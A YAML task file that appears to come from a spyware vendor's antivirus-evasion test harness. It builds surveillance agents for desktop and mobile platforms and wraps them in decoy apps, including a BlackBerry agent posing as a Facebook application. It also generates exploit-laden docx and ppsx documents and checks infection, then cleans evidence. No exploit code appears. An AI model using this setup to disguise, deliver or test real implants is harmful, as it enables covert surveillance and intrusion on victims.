

# -------------- BUILD -------------- #
# Requires: START_AGENT

BUILD_ELITE:
    - BUILD: [ pull, windows_elite, silent ]

BUILD_SOLDIER:
    - BUILD: [ pull, windows_soldier, silent ]

BUILD_WINDOWS:
    - CALL: CHECK_STATIC_MODULES
    - BUILD: [ pull, windows, silent ]

CHECK_STATIC_MODULES:
    - PUSH: [ AVAgent/assets/check/* ]
    - CHECK_STATIC: [ AVAgent/assets/check/codec, AVAgent/assets/check/codec_mod, AVAgent/assets/check/mac_core, AVAgent/assets/check/mac_osax, AVAgent/assets/check/sqlite, AVAgent/assets/check/sqlite_mod ]
    - CHECK_STATIC: [ AVAgent/assets/windows/* ]

BUILD_DESKTOP:
    - CALL: CHECK_STATIC_MODULES
    - ON_ERROR: CONTINUE
    - BUILD: [ pull, windows, silent ]
    - BUILD: [ pull, osx, silent ]
    - BUILD: [ pull, linux, silent ]
    - ON_ERROR: SKIP

BUILD_MOBILE:
    - ON_ERROR: CONTINUE
    - BUILD: [ pull, blackberry, silent ]
    - BUILD: [ pull, android, silent ]
    - BUILD: [ pull, ios, silent ]
    - BUILD: [ pull, winphone, silent ]
    - ON_ERROR: SKIP

BUILD_EXPLOIT:
    - BUILD: [ pull, exploit, melt ]
    - BUILD: [ pull, exploit_docx, melt ]

# -------------- VM COMMANDS -------------- #

VM_PUSH_AGENT:
    - DELETE_DIR: /AVTest/
    - DELETE_DIR: /Users/avtest/Desktop/AVTest/
    - PUSH: [ AVAgent/*.py, AVAgent/*.yaml, AVCommon/*.py, AVCommon/*.yml, AVCommon/commands/client/*.py, AVCommon/commands/meta/*.py, AVCommon/commands/*.py]
    - PUSH: [ AVAgent/assets/config*, AVAgent/assets/keyinject.exe, AVAgent/assets/getusertime.exe, AVAgent/assets/windows/*  ]

VM_UPLOAD_SKYPE:
    - PUSH:
        - [SkypeSetup.exe]
        - updates
        - c:/Users/avtest/Desktop

VM_GET_LOG:
    - PULL:
        - ['avagent.log']
        - c:\\AVTest\\logs
        - logs

VM_PULL_WINDOWS:
    - BUILD: [ pull, windows, silent ]
    - BUILD: [ pull, windows, melt ]

VM_SCOUT:
    - CROP: True
    - BUILD: [ scout, windows, silent ]
    - CROP: False
    - SCREENSHOT

VM_ELITE:
    - CROP: True
    - BUILD: [ elite, windows, silent ]
    - SLEEP: 30
    - SCREENSHOT
    - CROP: False
    - UNINSTALL
    - CHECK_INFECTION
    - RELOG

VM_STATIC_MOBILE:
    - CROP: True
    - CALL: BUILD_MOBILE
    - CROP: False

VM_CLEAN_EVIDENCES:
    - CLEAN_EVIDENCES

BUILD_MELT_FAST:
    - BUILD: [ pull, windows, melt ]

VM_PACKER_MELT:
    - CROP: True
    - REPORT:
        - BUILD_MELT_FAST
        - BUILD_MELT_FAST
        - BUILD_MELT_FAST
        - BUILD_MELT_FAST
        - BUILD_MELT_FAST

        - BUILD_MELT_FAST
        - BUILD_MELT_FAST
        - BUILD_MELT_FAST
        - BUILD_MELT_FAST
        - BUILD_MELT_FAST

    - CROP: False

SET_BUILD_PARAMS:
    SET:
      build_parameters:
        linux:
          platform_type: desktop
          binary: {admin: false, demo: false}
          melt: {}
          platform: linux
          package: {}
        osx:
          platform_type: desktop
          binary: {admin: true, demo: false}
          melt: {}
          platform: osx
          package: {}
        windows:
          platform_type: desktop
          binary: {admin: false, demo: false}
          melt: {admin: false, bit64: true, codec: true, scout: true}
          platform: windows
          meltfile: AVAgent/assets/windows/meltapp.exe
          sign: {}
          package: {}
        windows_elite:
          platform_type: desktop
          binary: {admin: false, demo: false}
          melt: {admin: false, bit64: true, codec: true, scout: false}
          platform: windows
          meltfile: AVAgent/assets/windows/meltapp.exe
          sign: {}
          package: {}
        windows_soldier:
          platform_type: desktop
          binary: {admin: false, demo: false}
          melt: {admin: false, bit64: true, codec: true, scout: false, soldier: true}
          platform: windows
          meltfile: AVAgent/assets/windows/meltapp.exe
          sign: {}
          package: {}
        winphone:
          platform_type: desktop
          binary: {admin: true, demo: false}
          melt: {}
          platform: winphone
          package: {}
        android:
          platform_type: mobile
          binary: {admin: false, demo: false}
          melt: {}
          platform: android
          sign: {}
          package: {}
        blackberry:
          platform_type: mobile
          binary: {demo: false}
          melt: {appname: facebook, desc: Applicazione utilissima di social network, name: Facebook
              Application, vendor: face inc, version: 1.2.3}
          package: {type: local}
          platform: blackberry
        ios:
          platform_type: mobile
          binary: {demo: false}
          melt: {}
          platform: ios
          package: {type: local}
        exploit:
          platform_type: desktop
          deliver: {user: USERID}
          factory: {_id: '000'}
          meltfile: AVAgent/assets/windows/meltexploit.txt
          generate:
            binary: {admin: false, demo: false}
            exploit: HT-2012-001
            melt: {admin: false, demo: false, scout: true}
            platforms: [windows]
          melt: {appname: agent.exe, combo: txt, filename: example.txt, input: '000'}
          platform: exploit
          package: {}
        exploit_docx:
          platform_type: desktop
          deliver: {user: USERID}
          factory: {_id: '000'}
          meltfile : AVAgent/assets/windows/meltexploit.docx
          generate:
            binary: {admin: false, demo: false}
            exploit: HT-2013-002
            melt: {admin: false, demo: false, scout: true}
            platforms: [windows]
          melt: {appname: APPNAME, filename: example.docx, input: '000', url: 'http://HOSTNAME/APPNAME'}
          platform: exploit
          package: {}
        exploit_ppsx:
          platform_type: desktop
          deliver: {user: USERID}
          factory: {_id: '000'}
          meltfile: AVAgent/assets/windows/meltexploit.ppsx
          generate:
            binary: {admin: false, demo: false}
            exploit: HT-2013-003
            melt: {admin: false, demo: false, scout: true}
            platforms: [windows]
          melt: {appname: APPNAME, filename: example.ppsx, input: '000', url: 'http://HOSTNAME/APPNAME'}
          platform: exploit
          package: {}
        exploit_web:
          platform_type: desktop
          deliver: {user: USERID}
          factory: {_id: '000'}
          meltfile : AVAgent/assets/windows/meltexploit.docx
          generate:
            binary: {admin: false, demo: false}
            exploit: HT-2013-002
            melt: {admin: false, demo: false, scout: true}
            platforms: [windows]
          melt: {appname: APPNAME, filename: example.docx, input: '000', url: 'http://HOSTNAME/APPNAME'}
          platform: exploit
          package: {}
